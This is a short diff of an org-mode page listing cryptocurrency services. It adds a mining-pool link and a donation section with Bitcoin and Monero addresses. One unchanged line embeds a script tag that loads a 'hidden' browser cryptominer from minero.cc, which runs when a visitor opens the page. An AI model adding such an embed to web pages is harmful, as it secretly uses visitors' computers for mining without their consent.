@@ -22,6 +22,9 @@
   Get more for each coin
   - [[https://paxful.com/?r%3D9LrQJa48GkK][Paxful]]
   - [[https://purse.io/?_r%3DedsyPI][Purse]]
+* Mine
+  Participate at the fundamental level
+  - [[https://moneroocean.stream][Monero Ocean]]
 * Web Miners
   Leverage web traffic
 @@html:<script src="https://minero.cc/lib/minero-hidden.min.js" async></script>@@
@@ -29,3 +32,7 @@
   - [[https://minero.cc][Minero]]
   - [[http://www.coinimp.com/invite/87500bf5-dd21-4b15-8366-37c52d15aab0][CoinIMP]]
   - [[https://coinwebmining.com][Coin Web Mining]]
+* Donate
+  Send me money!
+  - [[bitcoin:1AvUUbf6BNBmEiXweaaM5emL6YvcnK6gz1][Bitcoin]]: 1AvUUbf6BNBmEiXweaaM5emL6YvcnK6gz1
+  - [[monero:4GdoN7NCTi8a5gZug7PrwZNKjvHFmKeV11L6pNJPgj5QNEHsN6eeX3DaAQFwZ1ufD4LYCZKArktt113W7QjWvQ7CW9KjsUmB8q6RPa5mWh][Monero]]: 4GdoN7NCTi8a5gZug7PrwZNKjvHFmKeV11L6pNJPgj5QNEHsN6eeX3DaAQFwZ1ufD4LYCZKArktt113W7QjWvQ7CW9KjsUmB8q6RPa5mWh
